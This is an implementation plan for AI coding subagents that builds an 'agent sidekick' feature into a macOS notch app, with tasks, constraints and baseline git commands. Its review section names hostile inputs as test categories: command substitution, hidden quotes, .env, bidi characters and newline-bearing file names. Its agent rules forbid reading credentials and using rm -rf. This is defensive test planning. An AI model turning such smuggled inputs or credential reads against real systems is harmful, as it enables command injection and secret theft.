# F1-mac: The Agent Sidekick in the macOS App Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Sub-project F1 on the Mac. The cats say something useful at task boundaries, and only there: a **recap** when you come back after being away and an agent did something; **one grey line and a High risk badge** under each permission request; a **nudge** when an agent looks stuck; **"What's Claude doing?"** answered in the chat on this Mac; and a file **dropped on an agent's own cat** copied as a path and handed to that agent's app. It labels and remembers, it never decides (only the user's click answers a request), it needs no AI (a model on this computer may only polish a sentence), it keeps no prompt, no assistant text, no command and no full path, and it costs nothing while the island is hidden.

**Architecture:** Every rule is a pure Foundation file tested against F1-0's fixtures by a `swiftc` program, the way A, B and H did it: `SidekickExplain` (risk and line), `SidekickLedger` (`eventFrom` and the memory-only ledger), `SidekickStuck`, `SidekickRecap` (recap, status answer, matcher), `SidekickSettings` (dismissals, the stored block, `SidekickStore`), `SidekickPresence` (away and back, the Mac's notifications as flags, the idle sample's rule, the show gate), `SidekickNotes` (held and shown notes, `SidekickHost`, `SidekickClock`: the **one one-shot timer**), `SidekickVoice` and `SidekickVoiceLocal` (the sanity check and the one request to a model **on this computer**, never by Auto) and `SidekickDrop`. `SidekickEngine` is the brain with everything the app knows handed in as closures, so scripted runs with a clock and a timer by hand prove the whole flow without launching anything. The app's side is thin: `Sidekick` (the wall clock, the timer, the feed that `HookServer` calls at the top of each handler **before** the pending-approval gate), `PresenceMonitor` (the Mac's lock, sleep and display notifications, observed once, taken out of `DesktopCatController` and shared), `SidekickView` (a `.sidekick` row that opens the island the way a finished task does: no window of its own), `AgentTarget` (the pill's routes to an agent's app, moved so a note and a drop share them), `SidekickChat`, `SidekickDropApp`, `SidekickVoiceApp` and Settings → Sidekick.

**Tech Stack:** Swift 6 (strict concurrency), SwiftUI, AppKit, Combine, CoreGraphics (`CGEventSource`), XcodeGen, `swiftc` test programs, Bash, Python 3 (the owner's fake-event script), Node only to run F1-0's contract.

**Spec:** `docs/superpowers/specs/2026-10-14-agent-sidekick-design.md` (all of it, "Rounds": the three owner checkpoints and the list of 14 Mac tasks, here 22). The contract is F1-0's, merged as `8df679a`: `shared/sidekick-core.js` (the tie-breaker), `tests/fixtures/sidekick/` and `docs/SIDEKICK-CONTRACT.md` (its plan, `docs/superpowers/plans/2026-10-14-f1-0-sidekick-contract.md`, has the interface). The prerequisite round is `docs/superpowers/plans/2026-10-14-mac-all-terminals.md`: Claude Code from every terminal reaches the Mac (`HookOrigin.swift`, the pending-approval passthrough, the pill's look frozen while a card is up, the session-keyed island tap), and this plan is written **against `notchmeow/rebrand` with that branch merged**. The format and the Mac code's conventions are H-mac's (`docs/superpowers/plans/2026-10-12-h-mac-desktop-cat.md`).

**Base:** a new branch `f1/mac-sidekick` in a git worktree, from `notchmeow/rebrand` at **`a5d9066` or later**, which already has `mac/all-terminals` merged (`NotchBuddy/Sources/App/HookOrigin.swift` exists), G1's file shelf merged (`ShelfDrop.swift`, the Ask and Shelf halves in `FileDropView.swift`, `IslandView.shelf`) and F1-0 merged (`git merge-base --is-ancestor 8df679a HEAD` must succeed). This plan never edits `shared/sidekick-core.js`, a fixture of `tests/fixtures/`, `design/prototype/cat-core.js`, `shared/theme.json`, a generated theme file or anything under `windows/`. Sub-project G1 (the shelf) is already in the base: this plan changes `FileDropView.swift` and `IslandWindowController.swift` on top of it, and Task 18 says how the drop rules are ordered (this plan's agent-cat test first, G1's Ask and Shelf halves only for what it does not take).

## Global Constraints

Every task's requirements include this section. Values are copied from the spec; the lines marked "(plan decision)" are choices this plan makes where the spec is silent, and are listed again under "Open questions for the owner".

- **Swift 6, SwiftUI and AppKit, no third-party dependencies.** The pure files (`SidekickText`, `SidekickExplain`, `SidekickLedger`, `SidekickStuck`, `SidekickRecap`, `SidekickSettings`, `SidekickPresence`, `SidekickNotes`, `SidekickVoice`, `SidekickDrop`) are Foundation only and carry no build condition; `SidekickStore` and `SidekickEngine` use Combine too; `SidekickVoiceLocal` is compiled with the AI core only (no `AppState`).
- **It labels and never decides.** Risk is a label (`low`, `medium`, `high`; `unsure` counts as `medium`): nothing the sidekick does allows, denies or blocks a request, and **no request is ever approved without the user's click** (CLAUDE.md). Nothing it has can write to the hook's socket.
- **Speak only at task boundaries; look at the work, not at the user; never cover the user's work.** A recap on return (**at most one per away period**, only if the user was away **at least 2 minutes**), a stuck nudge **at most once per session**, shown **only in the island**, never while a card (an approval or a question) is in front, never while the user types in the island, never while the island is open on the chat, a mail draft, the drop flow or Settings, and never while the user is away or the agent is rate-limited. A refused note is **held up to 30 s (a nudge) or 2 minutes (a recap)**, then dropped silently. **A nudge counts as given only once it was actually shown** (owner's answer, 2026-10-14): the contract leaves the call to `markNudged` to the app, and `SidekickEngine` makes it at the moment the note is presented; a nudge that was held and dropped without ever showing was never given, so the session may be offered it again.
- **Dismissals.** The five kinds are frozen like the cat IDs: `recap`, `stuck.loop`, `stuck.errors`, `stuck.waiting`, `stuck.silent`. A click on **Not now, OK or ×** counts; folding the island unseen, a note's time running out and a tap on Show me do not. **Two dismissals mute a kind**; Settings has an Unmute; the count persists across launches. **The risk badge and the permission line are never muted** and have no switch.
- **The thresholds (the contract's, pinned by the fixtures).** Loop: the same tool and command key 4 times in the last 8 calls, within 10 minutes, with no successful edit between. Errors: 3 failures in a row within 10 minutes, Claude Code only. Waiting: a request unanswered for 60 s whose card is not on screen; its words change in place at the app's give-up time (**115 s on the Mac**). Silent: 5 minutes after a finished step, a prompt or a subagent's stop, 15 minutes after a step that began and never ended, never while a kitten is under 10 minutes old. Away: lock, sleep, display off, or **300 s without input**; back: the last reason lets go (an idle sample under 3 s).
- **The permission card stays exactly as it ships.** One new 11 pt grey (`#8E939C`) single-line `Text` between the command and the buttons (`lineLimit(1)`), and a small orange `High risk` capsule at the trailing edge of the first row on **high-risk requests only**. On a high-risk request the cat gives the **existing** `surprised` emote once; **no new emote** is added. The card is a fixed 160 pt (98 pt of content): `scripts/render-approval-card.sh` proves it still fits. Island card only: the E3 chat cards come later.
- **Nothing existing is restyled** (CLAUDE.md). New views follow the existing style; Settings gets a new section; the island's `.note` view is the AI error flow and is not used for a sidekick note (a note is the `.sidekick` row, with its own `ViewLayout`).
- **0 % CPU when the island is hidden: no new timer or monitor on the hidden poll.** The sidekick has **one** one-shot timer, `SidekickClock`, on the wall clock, set only while a deadline is waiting (a stuck rule falls due, a held note runs out, a shown note's time is up) and **not set at all when no agent runs**. The Mac's notifications (lock, sleep, displays) are observed once by `PresenceMonitor`, taken out of `DesktopCatController`. The idle time is read through `CGEventSource.secondsSinceLastEventType` (no permission) **on a tick the island already has** (`IslandWindowController.pollFrame`: at most every 5 s, every second while the user is away by idle, only while an agent has a live session), on each hook event and on an unlock or a wake. `IslandPoller` is untouched (hidden 10 Hz, visible 60 Hz).
- **Privacy.** The ledger is **memory only**, capped (8 sessions, 40 entries each), never written to disk and **never logged**; the sidekick files contain no logging call. It keeps a basename, a command key (a hash) and counts, and **never** the prompt, the assistant's text, `transcript_path` (never read), a tool's output, a command, a full path or a file's contents; a line holds an agent's name, a project's basename, a count, up to 3 file basenames or a number of minutes, and nothing else. `scripts/test-sidekick-leak.sh` is the proof.
- **The local voice.** A nicer sentence **only from a model whose placement is `local`** (a server on `127.0.0.1`, `::1` or `localhost`, and Apple on-device), by the router's own `localChoice`, **never by the chat's Auto choice** (which can pick a cloud model); **no `AIFeature.cats`**; one request, not a conversation, nothing stored; given only the template's own words; at most 6 s; the template is shown first and stands on any failure; a permission line is never reworded.
- **"What's Claude doing?"** is answered **on this Mac, from the ledger, and never added to a conversation**: the chat's send path checks the matcher before any provider is chosen. The matcher takes only a whole short message.
- **A drop on an agent's own cat** hands over a path, not the file: **the big cat's drop is exactly as it ships** (the chat or Ask drop and G1's Ask and Shelf halves: the agent-cat test runs first and its answer is nil everywhere else). Targets: an agent's cat in the compact grid in A cat for each agent mode, or cat 2 in Two cats mode, with a live session. It copies the file's **original path** (several: one per line), brings the agent's app forward by the pill's own routes, shows `Copied the path — paste it into <Agent>`. It **never pastes, types or sends a keystroke**, never says "sent", "delivered" or "attached", and never runs `claude --resume`.
- **Frozen contract values.** The five dismissal kinds, the reason IDs of `explain` (a reason may be added, none renamed), the UserDefaults keys `sidekick.on` (Bool), `sidekick.local` (Bool) and `sidekick.dismissals` (the JSON text of kind to count), the pill IDs (`integration_claude`, `agent_cursor`, `agent_codex`, `agent_gemini`, `agent_antigravity`), the cat IDs, the frozen names of the earlier sub-projects, and the island view's raw value `sidekick`.
- **Stored values never throw and never skip the clean-up.** Everything read from UserDefaults goes through `SidekickSettings.clean` (a switch is on unless it is exactly the boolean `false`; a count is a whole number from 1 to 2, anything else is 0; an unknown kind is dropped; text that is not JSON is no dismissals) and is written only after it was cleaned. `CatSettings.clean` and every older fixture are as they were.
- **Fixtures decide.** Numbers compare within **1e-9**; strings, booleans, nulls and shapes compare exactly. `shared/sidekick-core.js` is the tie-breaker; this plan never edits it or a fixture. JSON cannot hold NaN, infinity or `undefined`, so each port adds its own tests for a time or a number that is not finite. JavaScript and ICU differ in a few places (`$`, `\b`, grapheme against code point): `Rx` and `SK.baseName` handle them once.
- **The App Store build** has the same sidekick (Debug, Release and App Store all carry `NM_SIDEKICK_ENGINE_PRESENT`, which `check-app-binary.sh` looks for). What differs is only what each platform already differs in: **Codex is the GitHub build's** (no Codex tag is routed in the App Store build), a chat's approval card exists only in the GitHub build (`#if !APPSTORE` in `Sidekick.swift`), and an agent's terminal, Cursor and Codex routes are `#if !APPSTORE` in `AgentTarget` exactly as they were, so the App Store build copies the path and brings VS Code forward and nothing more. The real home folder comes from `getpwuid`, not `NSHomeDirectory()` (the sandbox's container).
- **Never edit `NotchBuddy.xcodeproj` by hand.** A task that adds a Swift file to the app runs `cd NotchBuddy && xcodegen` before it builds and commits the regenerated `project.pbxproj`. A new Swift file that a test or render script compiles is added to that script's list.
- **No `UserDefaults` suite, and no `UserDefaults.standard` write, in any test or script.** A test builds `SidekickStore(backing:)` on a `MemoryBacking` (a dictionary); the render script uses a dictionary of its own. Tests that can write the app log set `NM_LOG_DIR` to a temp folder (`scripts/check-test-logs.sh`).
- **Nothing of Coucou's comes back**, and the names Coucou and Mochi appear in no new code (`scripts/check-no-leftovers.sh` stays green). No sound is added for a note (Stage C can add it later).
- **Models and commits** (CLAUDE.md, "Working with AI agents", 2026-10-12): Haiku 5.5 first, Sonnet 5.5 only on a named trigger, never Opus or Fable. Each commit is local only, never pushed, lists only the files its task names, and ends with the `Co-Authored-By` line of the model that did the task: `Claude Haiku 5.5` for `nm-implementer-light` and `nm-implementer`, `Claude Sonnet 5.5` for `nm-implementer-deep` and `nm-reviewer-deep`.
- **SUBAGENT RULES (put this block in every subagent brief):**
  1. Never launch, quit or replace any NotchMeow app. A Debug, Release or App Store **build** in the worktree is fine and is only built; the scripts that draw a PNG (`render-sidekick.sh`, `render-approval-card.sh`, `render-cats.sh`, `render-cat-settings.sh`) are not the app and may run. **No task sends a hook event to the app's socket:** the owner's `fake-sidekick-events.py` is run by the owner on a Debug build of their own, and its test uses a socket of its own.
  2. Install nothing. No network calls, no downloads (`npx --no-install` only; this plan needs neither `npm` nor `cargo`). Never run the real `claude`, and never read anything under `~/.claude` or any credential.
  3. Use `trash`, never `rm -rf`, for anything you delete by hand, and only for a literal path you name; put scratch files under `${TMPDIR:-/tmp}` with a unique folder name. (The test scripts clean their own `mktemp` folders with `rm -rf` in a `trap`, as every `scripts/test-*.sh` does: that is the repo's convention, not a command an agent runs.)
  4. No `UserDefaults` suite and no write to `UserDefaults.standard` or to `~/Library` in a test or script; tests write no log outside a temp `NM_LOG_DIR`.
  5. Never edit `shared/sidekick-core.js`, a fixture of `tests/fixtures/`, `design/prototype/cat-core.js`, `shared/theme.json`, a generated theme file or anything under `windows/`.
  6. Never push. Commit only in a task's commit step, after checking the worktree and the branch.
  7. Haiku 5.5 for every task except Tasks 9, 10, 12, 13 and 18 (Sonnet 5.5) and the final review; never Opus or Fable.
  8. Never rename a frozen ID, and write no `Coucou` or `Mochi` name anywhere in code, comments, scripts or tests.
  9. If a command is denied by a permission prompt, or a find text of an Edit block does not occur exactly once, stop and report it. Do not look for a workaround.

## Review Focus

The spec says what the sidekick does. It is silent on these inputs and conditions, and each would bite a person first, most likely first. Each line names the test that pins it.

1. **A note while the user is typing or the island is busy.** A nudge that falls due while the user types in the chat, a card waits, Settings is open or the drop flow is on screen. Expected: it never covers anything, is held up to 30 s (a recap 2 minutes), and is then dropped silently; it was never shown, so it is not counted as given and shows later when the island can host it. Tests: Task 7 (`SidekickHost` for all 19 views), Task 9 (the gate holds a note, the island's tick asks again once a second, 30 s drops it, the session is offered it again and it shows, once, when the gate opens) and Task 13's wiring pins.
2. **A request that is displaced, declined or answered in the terminal.** A second permission request that displaces the first, an `ask` answered at once for a tagged agent, a question that arrives as a permission request, a chat's own Claude Code run, a request the user answers in the terminal. Expected: the ledger counts what a session did and never a chat's own run, a stray request is never fed, a waiting nudge goes when the request was answered. Tests: Task 10's pins on the three feed points, Task 9 (`stale`), Task 2 (the sequences that displace).
3. **A hostile command or file name.** A command with `$(...)`, quotes that hide a word, `.env`, a bidi override or an emoji; a dropped file whose name has a line break. Expected: `explain` never throws and a line never holds a command or a path (`unsure` is `medium`); a path with a control character is never copied (a paste would run what follows). Tests: Task 1 (554 cases and a 3000-command fuzz), Task 18 (`clipboardText`).
4. **The Mac asleep overnight.** The minutes asleep must count as time away, and a one-shot timer does not fire while the Mac sleeps. Expected: the sidekick's clock is wall time (`asyncAfter(wallDeadline:)`), a wake evaluates at once, and a recap needs 2 minutes away. Tests: Task 6 (a whole night is one `back`), Task 9 (a return is noticed; the clock is set only while something waits), Task 12 (the monitor's flags).
5. **A hand-edited store.** `sidekick.on` as the text `"false"` or the number `0`, a count of `7`, `-1` or `"2"`, a `sidekick.dismissals` that is cut off. Expected: on, 2, 0 and no dismissals, never a throw, and Settings still opens. Tests: Task 5 (17 stored values, a hand-edited store).
6. **A drop that is not on an agent's cat.** The big cat, a drop in One cat mode, a drop on an agent cat whose agent has no session, a drag that starts over a cat and leaves it, and G1's Ask and Shelf halves. Expected: exactly today's drop; the island's drop view opens as soon as the pointer leaves the cat; `onDragExited` follows `onDragEntered` and never comes alone. Tests: Task 18 (the pure hit test and the wiring pins on the four drag callbacks).

---

## File Structure

| Path | Responsibility |
|---|---|
| `NotchBuddy/Sources/App/SidekickText.swift` | New. `Rx` (ICU with JavaScript's `$` and `\b`) and `SK` (`baseName`, `agentName`, `fnv1a`, `canon`, `commandKey`). Foundation only. |
| `NotchBuddy/Sources/App/SidekickExplain.swift` | New. `explain`: the risk and the line for a permission request, labelling only. |
| `NotchBuddy/Sources/App/SidekickLedger.swift` | New. `SKEvent`, `SKSession`, `SKLedger`, `eventFrom` and `apply`: the memory-only ledger. |
| `NotchBuddy/Sources/App/SidekickStuck.swift`, `SidekickRecap.swift`, `SidekickSettings.swift`, `SidekickStore.swift`, `SidekickPresence.swift`, `SidekickNotes.swift`, `SidekickVoice.swift`, `SidekickVoiceLocal.swift`, `SidekickDrop.swift` | New. The other pure ports and the store (see the Architecture). |
| `NotchBuddy/Sources/App/SidekickEngine.swift` | New. The brain: the whole flow with the app handed in as closures. |
| `NotchBuddy/Sources/App/Sidekick.swift` | New. The app's side: the wall clock, the one timer, the feed, `realHome`, the marker, the island hooks. |
| `NotchBuddy/Sources/App/PresenceMonitor.swift` | New. The Mac's lock, sleep and display notifications, observed once and shared; the idle read. |
| `NotchBuddy/Sources/App/SidekickView.swift`, `SidekickChat.swift`, `SidekickSettingsView.swift`, `SidekickVoiceApp.swift`, `SidekickDropApp.swift`, `AgentTarget.swift` | New. The `.sidekick` row, the chat's answer and chip, Settings → Sidekick, the voice's glue, the drop's glue, and the pill's routes to an agent's app. |
| `NotchBuddy/Sources/App/HookServer.swift`, `IslandTypes.swift`, `IslandViewContent.swift`, `IslandWindowController.swift`, `AppDelegate.swift`, `AppState.swift`, `FileDropView.swift`, `ClaudeService.swift`, `SettingsView.swift`, `DesktopCatController.swift`, `IslandRootView.swift`, `PairCatViews.swift`, `BotCanvasView.swift` | Modified, each by the few lines its task names. |
| `tests/Sidekick{Explain,Ledger,Stuck,Recap,Settings,Presence,Notes,Voice,Engine,Drop,Leak,Wiring}Tests.swift` | New. One program each; the leak test and the wiring test are the proofs of the privacy and the call sites. |
| `scripts/test-sidekick-{explain,ledger,stuck,recap,settings,presence,notes,voice,engine,drop,leak,wiring}.sh` | New. One script for each program. |
| `scripts/render-sidekick.sh`, `render-sidekick.swift`, `render-approval-card.sh`, `render-approval-card.swift` | The new script draws the notes and Settings → Sidekick; the card's script gains `--line` and `--risk`. |
| `scripts/fake-sidekick-events.py`, `scripts/test-fake-sidekick-events.sh`, `scripts/check-app-binary.sh` | The owner's fake sessions and their test; the binary check looks for the sidekick in all three builds. |
| `tests/DesktopCatWiringTests.swift`, `tests/HookOriginWiringTests.swift` | One pin each follows what moved (the observers to `PresenceMonitor`, the pill's routes to `AgentTarget`, the card's new arguments). |
| `.github/workflows/build.yml`, `CLAUDE.md`, `ARCHITECT.md`, `README.md`, `docs/SPEC.md`, `docs/INTEGRATIONS.md`, `docs/QA-MAC.md` | One CI step for each new script; the Mac lines; the roadmap row; the French spec's "Le compagnon"; what the sidekick reads; QA Step 15. |
| `NotchBuddy/NotchBuddy.xcodeproj/project.pbxproj` | Regenerated by `xcodegen`, never by hand. |

**Order of tasks.** The spec's list of Mac tasks is here in this order: the Swift ports and their tests (Tasks 1 to 8, then the engine, Task 9, which the spec's list does not have: it is where the flow is proved without the app); the ledger and its feed in `HookServer` (Task 10); the permission line and badge (Task 11); the shared `PresenceMonitor` and the idle tick (Task 12); the `.sidekick` island view, its hosting and the one-shot clock's wiring (Task 13); the local voice (Task 14); Settings (Task 15); **owner checkpoint 1** (Task 16); the status answer (Task 17); the agent-cat hit test and the drop (Task 18); the leak test and the wiring (Task 19); the fake events, the docs and CI (Task 20); **owner checkpoint 2** (Task 21); the final review and **checkpoint 3** (Task 22). **Two things moved against the spec's list.** (1) The engine is a task of its own and comes before the app's side, because the clock, the gate and the held notes are the part that is easy to get wrong and impossible to test inside the app. (2) The local voice and Settings come before the chat, so that checkpoint 1 can show Settings with its "Found: …" line.

## Tasks and agents

CLAUDE.md: the lightest model that fits. **Haiku 5.5 first; Sonnet 5.5 only on a named trigger.** The code is given in full in every task and its tests prove it, so the ports and the glue are Haiku. **Tasks 9, 10, 12, 13 and 18 are `nm-implementer-deep` (Sonnet 5.5, high): trigger 1**, platform APIs and concurrency the task must get right rather than copy (the engine's re-entrancy and its one clock; the hook handler's order and a main-actor one-shot timer; observers of system notifications and a controller that must stay green; the island's expansion, typing and pointer, and a refactor of shipping routes; AppKit's drag destination and the order of the drop rules). If a Haiku task's expected output differs and the cause is not obvious, or it fails twice, hand that task to `nm-implementer-deep` (trigger 2) and say so in the ledger. Coding agents load `ponytail:ponytail`, `superpowers:test-driven-development` and `superpowers:verification-before-completion` (the deep agent also `superpowers:systematic-debugging`); reviewers load `ponytail:ponytail-review` (the deep reviewer also `superpowers:requesting-code-review`). Effort: **medium** for light tasks (code given in full), **high** for `nm-implementer` and for every review.

| # | Task | Agent, model, effort | Review |
|---|---|---|---|
| 0 | Worktree and baseline | the session | none |
| 1 | The risk rules: `explain` | `nm-implementer-light`, Haiku 5.5, medium | `nm-reviewer` |
| 2 | The hook adapter and the ledger | `nm-implementer-light`, Haiku 5.5, medium | `nm-reviewer` |
| 3 | The stuck rules | `nm-implementer-light`, Haiku 5.5, medium | `nm-reviewer` |
| 4 | The recap, the status answer and the status question | `nm-implementer-light`, Haiku 5.5, medium | `nm-reviewer` |
| 5 | Dismissals, the stored settings and the store | `nm-implementer-light`, Haiku 5.5, medium | `nm-reviewer` |
| 6 | Presence, the flags, the idle sample and the show gate | `nm-implementer-light`, Haiku 5.5, medium | `nm-reviewer` |
| 7 | The notes and the one clock | `nm-implementer-light`, Haiku 5.5, medium | `nm-reviewer` |
| 8 | The local voice: the sanity check and the one-shot request | `nm-implementer-light`, Haiku 5.5, medium | `nm-reviewer` |
| 9 | The engine: the whole flow, with everything handed in | `nm-implementer-deep`, **Sonnet 5.5, high (trigger 1)** | `nm-reviewer` |
| 10 | The app's sidekick and the feed point in the hook server | `nm-implementer-deep`, **Sonnet 5.5, high (trigger 1)** | `nm-reviewer` |
| 11 | The permission line, the badge and the surprised emote | `nm-implementer`, Haiku 5.5, high | `nm-reviewer` |
| 12 | One `PresenceMonitor` for the desktop cat and the sidekick; the idle tick | `nm-implementer-deep`, **Sonnet 5.5, high (trigger 1)** | `nm-reviewer` |
| 13 | The `.sidekick` row: a note in the island | `nm-implementer-deep`, **Sonnet 5.5, high (trigger 1)** | `nm-reviewer` |
| 14 | The local voice in the app | `nm-implementer`, Haiku 5.5, high | `nm-reviewer` |
| 15 | Settings → Sidekick | `nm-implementer`, Haiku 5.5, high | `nm-reviewer` |
| 16 | **Owner checkpoint 1:** the card, the notes and Settings as pictures | the main session and the owner | none |
| 17 | "What's Claude doing?" in the chat | `nm-implementer`, Haiku 5.5, high | `nm-reviewer` |
| 18 | A drop on an agent's own cat | `nm-implementer-deep`, **Sonnet 5.5, high (trigger 1)** | `nm-reviewer` |
| 19 | Privacy and parity: the leak test, the timer pins, the builds | `nm-implementer`, Haiku 5.5, high | `nm-reviewer-deep` (reads it first) |
| 20 | The owner's fake events, the docs and CI | `nm-implementer-light`, Haiku 5.5, medium | `nm-reviewer` |
| 21 | **Owner checkpoint 2:** the scripted runs and the pictures | the main session and the owner | none |
| After 20 | The whole branch: privacy and security first, cross-task contracts, the Review Focus | `nm-reviewer-deep`, **Sonnet 5.5, high (trigger 4)** | none |
| 22 | **Owner checkpoint 3:** sign-off, then the owner's real-build checks | the main session and the owner | none |

## Execution

One worktree chat session runs the whole plan: branch `f1/mac-sidekick`, model **Sonnet 5.5 at high effort** (trigger 1: presence, timers and AppKit; trigger 4 for the privacy review at the end). Nothing is pushed. It may run in parallel with the Windows and Linux twin, which touches nothing under `NotchBuddy/`; G1 is already merged in the base.

**The session is started in three steps** (ARCHITECT.md), because a chip's first turn runs on the app's default model and a model change applies only from a session's next turn:

1. **Setup and stop.** The chip's prompt only sets up:

   > Run `git switch -c f1/mac-sidekick notchmeow/rebrand`, then Task 0 of `docs/superpowers/plans/2026-10-14-f1-mac-sidekick.md`: only its Steps 1 to 3 (the base checks: F1-0 is in the base and `mac/all-terminals` is merged). Read `CLAUDE.md`, `ARCHITECT.md`, that plan, `docs/superpowers/specs/2026-10-14-agent-sidekick-design.md` and `docs/SIDEKICK-CONTRACT.md`. If a base check fails, say so and stop. Reply "ready" and stop. Do not start Task 1.

2. **Model.** Once the owner starts the chip, the main session sets that session to Sonnet 5.5 at high effort (`set_session_model`, `set_session_effort`).
3. **Brief.** The main session then sends the controller brief as the next message.

**Controller brief** (what the main session sends once the model is set):

> Run `docs/superpowers/plans/2026-10-14-f1-mac-sidekick.md` with `superpowers:subagent-driven-development`, task by task, on branch `f1/mac-sidekick`. Dispatch each task to the agent the plan's "Tasks and agents" table names (`nm-implementer-light` and `nm-implementer` by default, Haiku 5.5; `nm-implementer-deep` for Tasks 9, 10, 12, 13 and 18 and for a task Haiku failed twice), then to `nm-reviewer`; fix what the review finds before the next task. Rules for you and for every subagent (put the plan's SUBAGENT RULES block in every brief):
>
> - **Where you are.** Before every commit run `git rev-parse --show-toplevel` and `git branch --show-current`: the first must be this worktree's folder (under `.claude/worktrees/`), the second `f1/mac-sidekick`. If either is wrong, stop and report. Commit with `git commit -F <file>`, never `-m`, with the trailer of the model that did the task. Never push.
> - **Ledger.** Keep a manual ledger at `.superpowers/sdd/2026-10-14-f1-mac-sidekick/progress.md` (the SDD plugin's scripts are refused by auto mode, so you write it by hand): one line per task with its agent, model, commit hash, test lines and review verdict, and any escalation to `nm-implementer-deep` with the trigger.
> - **Briefs are task-sized.** A brief carries one task: its text, the Global Constraints, the SUBAGENT RULES and the files it names. Never hand a subagent the whole plan.
> - **Reviews** read `git diff notchmeow/rebrand...HEAD` (three dots), narrowed to the task's files, never `..` and never a diff against a moving working tree.
> - **Every shell block in the plan passes `bash -n` before it is run**, and a script you write passes it too.
> - **Servers and processes.** Stop a server only by the PID you saved when you started it. Never launch, quit or replace a NotchMeow app: the builds are builds, the PNGs come from `render-sidekick.sh` and `render-approval-card.sh`. Install and download nothing. Never run the real `claude`; never read `~/.claude` or a credential. Trash only literal paths you name.
> - **Stop and report on any refusal** (a denied command, a permission prompt) and **when an Edit block's find text does not occur exactly once** (the tree is not what the plan expects): do not look for a workaround.
> - **Pings.** At each owner checkpoint (after Tasks 15, 20 and the final review), at the end, and whenever you stop (a refusal, a failed check, a question), send your report to the main session with `SendMessage`, addressed to its ListAgents name `NotchMeow — fork research & cat design` (the main session's `local_…` id, if the owner gives it, is the same recipient), as well as writing it in your own chat. The main session then double-checks the work (its own clone, merge and full checks) before anything reaches the owner.
> - **Owner checkpoints.** Run Tasks 1 to 15, then stop and report to the main session for owner checkpoint 1 (Task 16: copy the pictures into `.claude/checkpoints/f1-mac/` of the worktree, which is gitignored, and say what to look for). After the owner's reply run Tasks 17 to 20, then stop again for checkpoint 2 (Task 21). Then dispatch `nm-reviewer-deep` over the whole branch with the privacy review in its brief (Task 22, Step 1), fix what it finds, and stop for checkpoint 3.
>
> Report: the commits; the output of every `bash scripts/test-sidekick-*.sh` and `bash scripts/test-fake-sidekick-events.sh`, `bash scripts/test-shortcuts.sh`, `bash scripts/test-hotkeys.sh`, `bash scripts/check-test-logs.sh` and `bash scripts/check-no-leftovers.sh`; the Debug, Release and App Store build lines and the three `check-app-binary.sh` lines; the paths of the PNGs of each checkpoint; and anything you could not settle.

Before any follow-up turn (a fix round, a question, a resumed run), the main session checks the session is still on its configured model and effort.

## How to run this plan

**Blocks.** A code step is either **Create `path`** (the file's exact content) or **Edit `path`** (a find text that occurs exactly once, and its replacement). Apply an edit by replacing the find text with the replacement and nothing else; if the find text occurs zero or two times, stop and report: the tree is not what the plan expects. Never type a block from memory and never "improve" one. Several Edit blocks of one file are applied in the order the plan gives them. Every `Run:` line is run from the repository root (the worktree's top folder); `Expected: FAIL` and `Expected: PASS` say which way it must go, and the text after it says what to see. A test program's failing run prints `✗` lines, and its last line is `N test(s) failed.`; a passing one ends `All tests passed.` A compile that cannot find a file prints `error opening input file` (a red run before the code exists). A new script is made executable with the `chmod +x` line that follows its block.

**Mac commands.** The test programs are `swiftc` programs run through `scripts/test-sidekick-*.sh`; none needs Xcode. A build is `cd NotchBuddy && xcodegen && cd ..` and then `xcodebuild -project NotchBuddy/NotchBuddy.xcodeproj -scheme NotchBuddy -configuration Debug -derivedDataPath NotchBuddy/build build CODE_SIGNING_ALLOWED=NO`; the Release build is `-configuration Release -derivedDataPath NotchBuddy/build/release` and the App Store target `-scheme NotchMeowAppStore -configuration Debug -derivedDataPath NotchBuddy/build/store`, each with `CODE_SIGNING_ALLOWED=NO CODE_SIGNING_REQUIRED=NO` (git ignores `NotchBuddy/build/`). Add `2>&1 | tail -3` to read the last lines. **Never start a built app.** The scripts that draw a PNG write wherever `--out` says; this plan writes them under `${TMPDIR:-/tmp}/f1-mac-1` and `f1-mac-2`, and the checkpoints copy the ones the owner sees to `.claude/checkpoints/f1-mac/` of the worktree (never committed). A render compiles the whole app: about two to four minutes each. Do not edit a file of `NotchBuddy/Sources/App/` while a build or a render is running.

**A "bite".** Several tasks end with a one-line `sed` that breaks a rule on purpose, a run that must fail in the way the plan says, and the reverse `sed`: it proves the test can fail. Run the reverse `sed` and the test again before going on; a file left broken is a failed task.

**Looking at an image.** Several steps end with "look at it". The agent that ran the step opens the PNG with its file reader and says in one sentence what it sees against the thing named; a blank or broken image is a failed step. The owner's look is the checkpoint.

**Stages of one file.** Tasks 10 to 19 build `Sidekick.swift`, `SidekickWiringTests.swift`, `IslandViewContent.swift`, `IslandWindowController.swift`, `IslandTypes.swift` and `render-sidekick.swift` up in stages. Each later task's **Edit** blocks are written against the file exactly as the earlier tasks left it; apply them in the order the plan gives them.

**Dry-run clones.** A throwaway clone made with `git clone --local --shared` has no `windows/node_modules` and no Docker; nothing here needs either. Commit steps are not run in a clone, so a `git status` there shows every earlier task's files.

---
## Tasks

### Task 0: Worktree and baseline

No code and no commit: this makes sure the base is the one the plan expects. Its first three steps are what the chip's prompt runs before the model is set (see "Execution").

- [ ] **Step 1: Put the session's worktree on the plan's branch**

```bash
git status                                    # must be clean
git switch -c f1/mac-sidekick notchmeow/rebrand
git merge-base --is-ancestor 8df679a HEAD && echo "F1-0 (8df679a) is in the base"
test -f NotchBuddy/Sources/App/HookOrigin.swift && echo "mac/all-terminals is in the base"
git merge-base --is-ancestor a5d9066 HEAD && echo "G1 (the shelf, a5d9066) is in the base"
git log --oneline -6
```

Expected: `F1-0 (8df679a) is in the base`, `mac/all-terminals is in the base` and `G1 (the shelf, a5d9066) is in the base`. If either line is missing, the worktree was cut before the prerequisite round was merged: stop and tell the owner. Every later command runs from the root of this worktree. Never push.

- [ ] **Step 2: Check that the contract is there and green**

Run: `for f in shared/sidekick-core.js docs/SIDEKICK-CONTRACT.md tests/fixtures/sidekick/explain-cases.json tests/fixtures/sidekick/hook-cases.json; do test -f $f && echo "ok $f"; done`
Expected: four `ok …` lines. If one is missing, F1-0 is not in the base: stop.

Run: `bash scripts/test-sidekick-contract.sh 2>&1 | grep -E "^# (tests|pass|fail)|fixture files match|identical bytes"`
